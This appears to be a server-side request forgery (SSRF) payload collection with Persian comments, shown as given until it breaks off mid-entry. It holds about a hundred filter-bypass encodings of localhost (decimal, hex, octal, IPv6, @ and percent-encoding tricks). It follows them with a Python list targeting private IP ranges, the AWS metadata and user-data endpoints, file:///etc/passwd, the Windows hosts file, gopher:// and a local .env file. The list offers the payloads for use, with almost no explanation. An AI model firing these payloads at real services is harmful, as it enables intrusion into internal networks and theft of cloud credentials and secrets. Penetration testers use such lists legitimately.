نه1. http://[::1]  # IPv6 localhost
2. http://0  # نسخه دهدهی localhost
3. http://127.1  # کوتاه شده آی‌پی localhost
4. http://127.0.1.1  # آی‌پی مشابه localhost
5. http://2130706433  # نسخه دهدهی localhost
6. http://0x7F000001  # هگزادسیمال localhost
7. http://017700000001  # اکتال localhost
8. http://localhost:80  # پورت‌های مختلف
9. http://127.0.0.1:80  # پورت‌های مختلف
10. http://127.0.0.1.xip.io  # استفاده از سرویس‌هایی که آی‌پی را به دامنه تبدیل می‌کنند
11. http://localhost.burpcollaborator.net  # استفاده از دامنه‌های ترکیبی
12. http://169.254.169.254/latest/meta-data/ # AWS Metadata
13. http://[::1]:80  # آی‌پی نسخه ۶ با پورت
14. http://127.0.0.1/secure
15. http://127.1/secure
16. http://localhost/secure
17. http://2130706433/secure
18. http://[::1]/secure
19. http://0x7F000001/secure
20. http://localhost@127.0.0.1
21. http://127.0.0.1@localhost
22. http://localhost:8080/admin
23. http://127.0.0.1:8080/admin
24. http://127.0.0.1%23@localhost
25. http://localhost%23@127.0.0.1
26. http://127.0.0.1%23@127.0.0.1
27. http://localhost%23@localhost
28. http://127.0.1.1
29. http://2130706433:80
30. http://2130706433:8080
31. http://127.1:80
32. http://127.1:8080
33. http://127.0.0.1:22
34. http://127.0.0.1:443
35. http://127.0.0.1:8443
36. http://127.0.1.1:22
37. http://127.0.1.1:443
38. http://127.0.1.1:8443
39. http://[::1]:22
40. http://[::1]:443
41. http://[::1]:8443
42. http://localhost%23admin
43. http://127.0.0.1%23admin
44. http://127.0.1.1%23admin
45. http://2130706433%23admin
46. http://[::1]%23admin
47. http://127.0.0.1%252fadmin
48. http://localhost%252fadmin
49. http://127.0.1.1%252fadmin
50. http://2130706433%252fadmin
51. http://[::1]%252fadmin
52. http://127.0.0.1%2fadmin
53. http://localhost%2fadmin
54. http://127.0.1.1%2fadmin
55. http://2130706433%2fadmin
56. http://[::1]%2fadmin
57. http://127.0.0.1%2fsecure
58. http://localhost%2fsecure
59. http://127.0.1.1%2fsecure
60. http://2130706433%2fsecure
61. http://[::1]%2fsecure
62. http://localhost%40example.com
63. http://127.0.0.1%40example.com
64. http://localhost%2523example.com
65. http://127.0.0.1%2523example.com
66. http://localhost%23example.com
67. http://127.0.0.1%23example.com
68. http://localhost%252fexample.com
69. http://127.0.0.1%252fexample.com
70. http://localhost%2fexample.com
71. http://127.0.0.1%2fexample.com
72. http://127.0.0.1:%40example.com
73. http://localhost:%40example.com
74. http://127.0.1.1:%40example.com
75. http://2130706433:%40example.com
76. http://[::1]@example.com
77. http://localhost@example.com
78. http://127.0.0.1@example.com
79. http://localhost:username@example.com
80. http://127.0.0.1:username@example.com
81. http://127.0.1.1:username@example.com
82. http://2130706433:username@example.com
83. http://[::1]:username@example.com
84. http://localhost%40username@example.com
85. http://127.0.0.1%40username@example.com
86. http://localhost%23username@example.com
87. http://127.0.0.1%23username@example.com
88. http://localhost%2523username@example.com
89. http://127.0.0.1%2523username@example.com
90. http://localhost%252fusername@example.com
91. http://127.0.0.1%252fusername@example.com
92. http://localhost%2fusername@example.com
93. http://127.0.0.1%2fusername@example.com
94. http://127.0.1.1%2fusername@example.com
95. http://2130706433%2fusername@example.com
96. http://localhost@%40example.com
97. http://127.0.0.1@%40example.com
98. http://localhost@%23example.com
99. http://127.0.0.1@%23example.com
100. http://localhost@%2523example.com
101. ![IMG_20250126_120819_303](https://github.com/user-attachments/assets/43d50970-4529-4d2e-8bbc-4be647ebe8aa)
payloads = [
    # تست به localhost و IP های خصوصی
    "http://localhost:8080",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://192.168.1.1",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://10.0.0.2",
    "http://10.0.0.3",
    "http://10.0.0.4",
    "http://10.0.0.5",
    
    # تست به URLهای عمومی
    "http://example.com",
    "http://httpbin.org/get",
    "http://api.ipify.org",
    "http://jsonplaceholder.typicode.com/posts",
    "http://httpbin.org/ip",
    
    # تست به منابع داخلی
    "http://192.168.1.100/admin",
    "http://192.168.1.101:8080",
    "http://192.168.1.102:3000",
    "http://192.168.1.103:5000",
    "http://192.168.1.104:8000",
    
    # تست به AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data",
    
    # تست به سرویس‌های DNS
    "http://dns.google.com",
    "http://1.1.1.1",
    
    # تست به پروتکل‌های مختلف
    "ftp://example.com",
    "ftp://ftp.dlptest.com",
    "file:///etc/passwd",  # تست برای دسترسی به فایل‌های محلی
    "file:///C:/Windows/System32/drivers/etc/hosts",  # تست برای ویندوز
    "gopher://example.com",
    
    # تست به URLهای خاص
    "http://localhost:3000/api/v1/users",
    "http://localhost:5000/api/v1/data",
    "http://localhost:8000/api/v1/info",
    
    # تست به IP های عمومی
    "http://8.8.8.8",
    "http://1.1.1.1",
    "http://208.67.222.222",
    
    # تست به URLهای خاص
    "http://localhost:8080/admin",
    "http://localhost:8080/login",
    "http://localhost:8080/health",
    
    # تست به URLهای دیگر
    "http://www.google.com",
    "http://www.bing.com",
    "http://www.yahoo.com",
    
    # تست به URLهای API
    "http://api.github.com/users",
    "http://api.openweathermap.org/data/2.5/weather?q=London",
    
    # تست به URLهای دیگر
    "http://localhost:8080/robots.txt",
    "http://localhost:8080/.env",
    
    # تست به URLهای دیگر
    "http://localhost:8080/status",
    "http://localhost:8080/version",
    
    # تست به URLهای دیگر
    "http://localhost:8080/healthcheck",
    "http://localhost:8080/api/v1/status",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/health",
    "http://localhost:8080/api/v1/version",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/config",
    "http://localhost:8080/api/v1/metrics",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/logs",
    "http://localhost:8080/api/v1/debug",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/alerts",
    "http://localhost:8080/api/v1/events",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/notifications",
    "http://localhost:8080/api/v1/updates",
    
    # تست به URLهای دیگر
    "http://localhost:8080/api/v1/commands",
    "http://localhost:8080/api/v1/tasks",
    
    # تست به URLهای دیگر
    "http